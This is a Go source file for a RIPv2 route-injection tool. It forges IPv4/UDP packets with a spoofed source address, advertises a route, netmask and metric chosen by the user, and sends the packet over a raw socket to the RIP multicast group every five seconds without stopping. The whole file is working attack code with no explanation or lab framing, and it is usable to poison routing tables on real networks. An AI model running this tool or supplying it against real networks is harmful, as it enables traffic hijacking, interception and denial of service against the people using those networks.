package main

import (
  "bytes"
  "encoding/binary"
  "flag"
  "fmt"
  "log"
  "net"
  "syscall"
  "time"

  "github.com/miekg/rip"
  "golang.org/x/net/ipv4"
)

const debug bool = false
const udpHeaderLen = 8
const ipv4Protocol = 17

type udpHeader struct {
  SrcPort  uint16
  DstPort  uint16
  Length   uint16
  Checksum uint16
}

func forgeDatagram(data []byte, source string, destination string) []byte {

  // Parse function parameters
  dstIP := net.ParseIP(destination)
  srcIP := net.ParseIP(source)

  // Fill UDP header with RIP protocol information (source and destination ports have to be both 520)
  header := udpHeader{
    SrcPort: 520,
    DstPort: 520,
    Length:  uint16(udpHeaderLen + len(data)),
    //Checksum: uint16(0x647d),
  }
  if debug {
    fmt.Printf("UDP header: %v\n", header)
  }

  // Write UDP header to buffer
  buf := bytes.NewBuffer([]byte{})
  err := binary.Write(buf, binary.BigEndian, &header)
  if err != nil {
    log.Fatal(err)
  }

  // Append the RIP data to the UDP header in order to create a UDP datagram
  headerBytes := buf.Bytes()
  udpDatagram := append(headerBytes, data...)
  if debug {
    fmt.Printf("UDP datagram: %v\n", udpDatagram)
  }

  // Setup IPv4 header
  ipv4Header := &ipv4.Header{
    Version:  ipv4.Version,
    Len:      ipv4.HeaderLen,
    TotalLen: ipv4.HeaderLen + udpHeaderLen + len(data),
    ID:       0x0000,
    Protocol: ipv4Protocol,
    Dst:      dstIP.To4(),
    Src:      srcIP.To4(),
    TTL:	1,
    TOS:	0xc0,
    Flags:	0x4000,
  }
  if debug {
    fmt.Printf("IPv4 header: %v\n", ipv4Header)
  }

  // Convert IPv4 header to a stream of bytes
  ipv4Bytes, err := ipv4Header.Marshal()
  if err != nil {
    log.Fatal(err)
  }

  // Append UDP datagram to IPv4 header
  ipv4Datagram := append(ipv4Bytes, udpDatagram...)
  if debug {
    fmt.Printf("IPv4 datagram: %v\n", ipv4Datagram)
  }
  return ipv4Datagram
}

func main() {

  // Parse CLI arguments
  netPtr := flag.String("network", "", "the network address to advertise")
  metPtr := flag.Int("metric", 1, "the metric for the route")
  srcPtr := flag.String("src", "", "the source IP address to spoof")
  dstPtr := flag.String("dst", "224.0.0.9", "the destination IP address, default value is multicast")
  mskPtr := flag.String("netmask", "255.255.255.0", "the subnet mask for the advertised network")
  flag.Parse()

  // Check if all the required parameters have been inserted
  if (*netPtr == "") || (*srcPtr == "") {//|| (*nicPtr == "") {
    log.Fatal("Missing parameters! Exiting...")
  }

  // Print all of the input data as a check
  fmt.Println("\nNetwork:\t\t", *netPtr)
  fmt.Println("Metric:\t\t\t", *metPtr)
  fmt.Println("Spoofed source address:\t", *srcPtr)
  fmt.Println("Destination address:\t", *dstPtr)
  fmt.Printf("Subnet mask:\t\t %s\n\n", *mskPtr)

  // Prepare input data to be used to create the packet
  routeTag := uint16(0)
  netAddr := net.ParseIP(*netPtr)
  dstAddr := net.ParseIP(*dstPtr)
  // Parse subnet mask as uint32
  netmask := net.ParseIP(*mskPtr)
  netmaskInt := binary.BigEndian.Uint32(netmask[12:16])
  metric := uint32(*metPtr)

  // Setup the fake route and create the packet
  nextHop := net.ParseIP("0.0.0.0")
  rtePtr := rip.NewRoute(netAddr, nextHop, netmaskInt, metric, routeTag)
  pktPtr := rip.New(2, 2)
  pktPtr.Routes = append(pktPtr.Routes, rtePtr)
  packet, _ := pktPtr.Pack()


  ipv4Datagram := forgeDatagram(packet, *srcPtr, *dstPtr)
  if debug {
    fmt.Printf("%v\n", ipv4Datagram)
  }
  
  // Convert destination address to a 4-byte-long array
  var dstBytes [4]byte
  copy(dstBytes[:], dstAddr.To4())
	
  // Setup the connection
  fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
  if err != nil {
    log.Fatal(err)
  }

  err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
  if err != nil {
    log.Fatal(err)
  }
  
  // Open the connection and start sending datagrams
  addr := syscall.SockaddrInet4{Addr: dstBytes}
  timesSent := 1
  fmt.Printf("Sending route...  ")
  for true {
	err = syscall.Sendto(fd, ipv4Datagram, 0x4000, &addr)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("\b%d", timesSent)
	timesSent++
	time.Sleep(5000 * time.Millisecond)
  }
  syscall.Close(fd)
}
